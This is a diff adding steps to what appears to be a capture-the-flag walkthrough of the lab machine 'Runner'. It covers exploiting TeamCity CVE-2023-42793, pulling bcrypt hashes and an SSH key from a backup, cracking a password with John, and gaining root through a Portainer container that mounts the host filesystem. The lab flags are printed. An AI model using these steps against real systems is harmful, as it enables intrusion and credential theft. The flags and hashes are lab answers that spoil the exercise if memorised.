@@ -35,5 +35,94 @@ there is a CVE-2023-42793 for it
 
 using python3 exploit.py -u <URL of the teamcity> couple of time to get user and password with admin privileges
 
+in the administrator profile there an option the download a backup file 
+
+unzip the backupfile
+
+inside the backup file there is a ssh key and credentials for some users:
+1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1713983708180, BCRYPT
+2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
+11, h454nsec6744, $2a$07$psRCFuz6iakzSbWvTcWTeO4Xgg01QUEPbE.VwmGK6eLbDpweCnVO., , "", 1713983089513, BCRYPT
+12, city_admindyak, $2a$07$2YKWwT95SNmBkMijY2CfauVri5EneVRHvp2g970iIaOYEV1oMApQO, , angry-admin@funnybunny.org, 1713983126822, BCRYPT
+13, lelster, $2a$07$4uGASmII/FhraYrvg7LGHeChYIabpnF6o5Yif8DMaxxMga61be6Ne, , lelster@example.com, 1713984506362, BCRYPT
+14, session, $2a$07$Ycnczo0WL0EZCgQ9t9gcPuwwjC17Jcq2s16O9qSR7f0Rg952mTk8y, , session@example.com, 1713986145935, BCRYPT
+15, admin2, $2a$07$wbeYOGDVbKGkroUjqTiu5OkfuF8m4afGlcs9KitNL0Mab27hMr12W, , admin2@example.com, 1713986482231, BCRYPT
+16, admin3, $2a$07$MzIMyKk8bFar9Cwo2wqzRuWQUe9qXU1BxLK3qf8ko7jtmDCDdzLje, , admin3@example.com, 1713986600812, BCRYPT
+17, paul, $2a$07$IDLMSq/qyW9CI0ahfotjWuJHOQ6H5NNnuC4BbKsbpJ6.Fm48T2/Hy, , paul@example.com, 1713986782226, BCRYPT
+
+inside the backup file there is also a ssh key in /config/projects/AllProjects/pluginData/ssh_keys/
+
+using sudo ssh -i id_rsa john@10.10.11.13
+
+getting connetion and getting the user flag:
+ca59c896490e30bbfd65f03064b63204
+
+using netstat -an discovering that some service using port 9000
+
+portforwaring this port using:
+
+ssh -L 9000:127.0.0.1:9000 -i id_rsa john@10.10.11.13
+
+entering the browser and getting portainer.io dashboard
+
+using john to decrypt the matthew password
+
+john pass.matthew --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 128 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+piper123         (?)     
+1g 0:00:01:04 DONE (2024-04-25 21:23) 0.01548g/s 806.3p/s 806.3c/s 806.3C/s playboy93..onelife
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+connecting with the credentials we have 
+
+now we need to create a container with root permissions
+
+in left dashboard we need to select volume 
+
+using name root
+
+in driver we select local
+
+adding 3 device options 
+
+1 - device value /
+2 - o value bind
+3 - type value none 
+
+now we need to create the container
+
+image teamcity:latest
+
+off the Always pull the image
+
+in Advanced container settings we select Interactive & TTY 
+
+in Volumes we add map additional volumes 
+
+in container we need to add /mnt/root
+
+in volume root -local
+
+deploying the container
+
+entering the console tab 
+
+using custom command and entering the root as user
+
+connecting as root and getting the root flag
+
+cd /mnt/root/root
+
+cat root.txt:
+
+8b253f547edb35fb088b5a03ef163830
+
+
 
 
